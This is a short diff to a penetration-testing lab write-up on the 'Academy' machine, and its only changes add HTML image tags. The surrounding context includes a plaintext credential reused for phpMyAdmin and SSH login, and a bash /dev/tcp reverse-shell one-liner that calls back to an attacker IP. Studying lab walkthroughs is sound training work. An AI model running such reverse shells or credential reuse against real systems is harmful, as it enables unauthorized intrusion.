@@ -1839,7 +1839,7 @@ grimmie:My_V3ryS3cur3_P4ss
 	
 - wait lets see if we can login to `http://10.0.2.6/phpmyadmin/index.php` with these creds 
 - WE SURE CAN 
-	![[Academy-phpMyadminLoginSuccessful.png]] 
+	![[Academy-phpMyadminLoginSuccessful.png]] <img src="Academy-phpMyadminLoginSuccessful.png"> 
 - gonna ssh into the server as `grimmie` now. lets see what privilages he has 
 ```
 grimmie@academy:~$ groups
@@ -1877,3 +1877,4 @@ bash -i >& /dev/tcp/10.0.2.4/1337 0>&1
 
 - WE GOT ROOOOOOOOOOOOTTTTTTTTTT
 ![[AcademyHasBeenRooted.png]] 
+<img src="AcademyHasBeenRooted.png"> 
